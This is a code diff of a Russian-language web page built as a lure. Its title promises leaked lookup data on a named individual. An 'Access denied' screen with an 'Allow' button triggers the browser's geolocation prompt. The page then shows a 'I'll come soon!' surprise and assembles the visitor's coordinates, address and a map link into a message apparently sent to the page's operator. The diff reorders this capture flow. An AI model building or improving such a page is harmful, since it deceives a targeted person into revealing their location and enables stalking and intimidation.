@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Доступ</title>
+    <title>данные_пробива_Ивана_Потылицина</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -242,7 +242,7 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 2: "Доступ запрещён" + кнопка "Разрешить" -->
+    <!-- ЭКРАН 2: Запрос геолокации (ЗДЕСЬ ПОЯВЛЯЕТСЯ СИСТЕМНЫЙ ЗАПРОС) -->
     <div class="full-center hidden" id="step2">
         <div class="card">
             <div class="step2-title">⛔ Доступ запрещён</div>
@@ -251,7 +251,7 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 3: Сюрприз -->
+    <!-- ЭКРАН 3: СЮРПРИЗ (открывается только ПОСЛЕ разрешения) -->
     <div class="full-center hidden" id="step3">
         <div class="card">
             <div class="surprise">🎉 Я скоро приду!</div>
@@ -388,8 +388,19 @@
             }
         }
 
-        // ====== ГЕОЛОКАЦИЯ ======
-        function getLocation() {
+        // ====== ГЕОЛОКАЦИЯ (ЗАПУСКАЕТСЯ НА ВТОРОМ ЭКРАНЕ) ======
+        function requestLocation() {
+            // Показываем третий экран (сюрприз) — только после того, как запрос уже запущен
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+
+            if (!map) {
+                map = L.map('map').setView([55.7558, 37.6173], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© OpenStreetMap'
+                }).addTo(map);
+            }
+
             const status = document.getElementById('statusText');
             const coords = document.getElementById('coordsDisplay');
             const accEl = document.getElementById('accuracyDisplay');
@@ -442,7 +453,6 @@
 
                     addressEl.textContent = address;
 
-                    // Отправляем финальное сообщение с геолокацией
                     const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16`;
                     const finalMsg =
                         `📍 Я скоро приду!\n\n` +
@@ -480,27 +490,16 @@
             document.getElementById('step2').classList.remove('hidden');
         });
 
-        // ====== ШАГ 2 → ЗАПРОС ГЕОЛОКАЦИИ ======
+        // ====== ШАГ 2 → ЗАПРОС ГЕОЛОКАЦИИ → СЮРПРИЗ ======
         document.getElementById('allowBtn').addEventListener('click', function() {
-            // Отправляем уведомление о нажатии
             notifyClick();
 
-            // Если сюрприз уже показан — не показываем повторно
             if (isSurpriseShown) {
                 return;
             }
 
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
-
-            if (!map) {
-                map = L.map('map').setView([55.7558, 37.6173], 13);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    attribution: '© OpenStreetMap'
-                }).addTo(map);
-            }
-
-            getLocation();
+            // Вызываем геолокацию и сразу переключаем на третий экран
+            requestLocation();
         });
     </script>
 
